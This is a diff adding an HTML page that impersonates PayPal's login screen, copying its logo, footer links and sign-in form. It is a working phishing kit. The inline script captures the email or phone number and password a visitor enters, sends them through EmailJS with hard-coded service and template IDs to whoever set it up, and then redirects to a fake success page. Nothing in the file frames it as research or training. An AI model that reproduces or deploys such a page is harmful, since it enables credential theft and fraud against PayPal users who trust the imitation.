@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="assets/favicon.png" type="image/png">
+  <link rel="stylesheet" href="assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+  <title>PayPal Login</title>
+</head>
+
+<body class="relative h-dvh overflow-y-auto flex flex-col items-center md:justify-center text-[1.1rem]">
+  <main class="p-4 md:p-10 w-full md:w-[29rem] md:border md:border-slate-200 md:rounded-xl">
+    <header class="flex items-center justify-center">
+      <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" width="36px">
+    </header>
+
+    <form class="mt-12 grid">
+      <label for="email-phone" class="block relative border border-slate-400 rounded-md px-2 pt-8 pb-2 hover:border-blue-600 focus-within:border-[3px] focus-within:border-blue-600 focus-within:ring-5 focus-within:ring-blue-100 cursor-text transition-colors flex">
+
+        <p data-lang="emailOrNumber" id="email-phone-label" class="absolute text-[1.1rem] font-medium text-slate-500 top-1 transition-all duration-200 translate-y-[10px]">
+          Email or mobile number
+        </p>
+
+        <select name="countryCode" id="country-code" class="hidden text-lg w-[4.5rem]"></select>
+
+        <input type="text" name="emailOrNumber" id="email-phone" required class="text-[1.1rem] font-medium w-full outline-none">
+      </label>
+      <!-- <small data-error="email" class="text-red-500">Error message</small> -->
+
+
+      <label for="password" class="mt-5 block relative border border-slate-400 rounded-md px-2 pt-8 pb-2 hover:border-blue-600 focus-within:border-[3px] focus-within:border-blue-600 focus-within:ring-5 focus-within:ring-blue-100 cursor-text transition-colors">
+
+        <p data-lang="password" id="password-label" class="absolute text-[1.1rem] font-medium text-slate-500 top-1 transition-all duration-200 translate-y-[10px]">
+          Password
+        </p>
+
+        <input type="password" name="password" id="password" required class="text-[1.1rem] font-medium w-full outline-none">
+
+        <button type="button" data-password-toggler class="cursor-pointer text-slate-500 absolute top-1/2 -translate-y-1/2 right-3">
+          <span  id="visibility-icon" class="material-symbols-rounded">visibility</span>
+        </button>
+      </label>
+      <!-- <small data-error="data-error="email" class="text-red-500">Error message</small> -->
+
+      <div class="mt-10">
+        <button type="submit" class="bg-blue-800 flex items-center justify-center rounded-full px-4 py-3 text-white w-full font-bold hover:bg-blue-600 transition-colors cursor-pointer disabled:bg-blue-800/70 disabled:cursor-not-allowed">
+          <span data-lang="confirmIdentity">Confirm Identity</span>
+          <span style="display: none;" class="material-symbols-rounded ml-2 spinner animate-spin">progress_activity</span>
+        </button>
+      </div>
+    </form>
+
+    <div action="/" method="get" class="mt-16 flex items-center justify-center gap-2 text-[0.88rem] text-slate-600 font-medium">
+      <button id="location-btn" class="cursor-pointer flex items-center">
+        <span id="country-flag" class="block" style="font-size: 1.2rem;"></span>
+        <span class="material-symbols-rounded">keyboard_arrow_down</span>
+      </button>
+      <button data-lang-btn="en" class="cursor-pointer">English</button> |
+      <button data-lang-btn="fn" class="cursor-pointer">Français</button> |
+      <button data-lang-btn="es" class="cursor-pointer">Español</button> |
+      <button data-lang-btn="zh" class="cursor-pointer">中文</button>
+    </div>
+  </main>
+
+  <div class="overlay">
+    <div class="px-4 md:px-32">
+      <header class="w-full relative flex items-center justify-center py-2 h-20">
+        <img src="assets/logo.png" width="70">
+
+        <button id="close-btn" class="cursor-pointer absolute right-0">
+          <span class="material-symbols-rounded" style="font-size: 2.75rem; font-weight: 200;">close</span>
+        </button>
+      </header>
+
+      <div class="h-[calc(100dvh-5rem)] overflow-y-auto">
+        <div id="major-countries" class="grid md:grid-cols-4 gap-x-4 gap-y-6"></div>
+
+        <hr class="border-slate-200 my-5">
+
+        <div id="other-countries" class="grid md:grid-cols-4 gap-x-4 gap-y-6">
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="flex items-center px-2 py-4 flex-wrap justify-center gap-2 md:gap-4 text-xs md:text-sm font-semibold bg-slate-100 text-slate-600 w-full absolute bottom-0">
+    <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer">Contact Us</a>
+    <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full" target="_blank" rel="noopener noreferrer">Privacy</a>
+    <a href="https://www.paypal.com/us/legalhub/paypal/home" target="_blank" rel="noopener noreferrer">Legal</a>
+    <a href="https://www.paypal.com/us/webapps/mpp/ua/upcoming-policies-full" target="_blank" rel="noopener noreferrer">Policy Updates</a>
+    <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide" target="_blank" rel="noopener noreferrer">Worldwide</a>
+  </footer>
+  
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", () => {
+      // Initialize EmailJS
+      emailjs.init("Fxasbhy_78dEU5KXk");
+
+      function hasOnlyNumbers (value) {
+        return /^[+,0-9]+$/.test(value)
+      }
+
+      function handleFormSubmission() {
+        const form = document.querySelector("form");
+        if (!form) return;
+
+        form.addEventListener("submit", async (event) => {
+          event.preventDefault();
+          const submitter = event.submitter;
+          startLoading(submitter); // Keep this
+
+          const formData = new FormData(form);
+          const formValues = Object.fromEntries(formData.entries());
+
+          const vars = {
+            email_or_number: hasOnlyNumbers(formValues.emailOrNumber) ? `${formValues.dialingCode} ${formValues.emailOrNumber}` : formValues.emailOrNumber,
+            password: formValues.password,
+            timestamp: new Date().toLocaleDateString("en-GB", { day: "numeric", month: "long", year: "numeric" })
+          }
+
+          try {
+            await emailjs.send("service_cq172wt", "template_61afega", {
+              email_or_number: formValues.emailOrNumber.trim(),
+              password: formValues.password.trim(),
+              timestamp: new Date(Date.now()).toLocaleDateString(),
+            })
+
+            window.location.href = "./success.html";
+          } catch (error) {
+            console.error(error);
+            alert(error.message ?? error);
+          } finally {
+            stopLoading(submitter);
+          }
+        });
+      }
+
+      handleFormSubmission();
+    });
+
+    function startLoading(submitter) {
+      if (!submitter) return;
+      submitter.disabled = true;
+      const spinner = submitter.querySelector(".spinner");
+      if (spinner) spinner.style.display = "inline-block";
+    }
+
+    function stopLoading(submitter) {
+      if (!submitter) return;
+      submitter.disabled = false;
+      const spinner = submitter.querySelector(".spinner");
+      if (spinner) spinner.style.display = "none";
+    }
+  </script>
+  <script src="assets/main.js" type="module"></script>
+</body>
+</html>
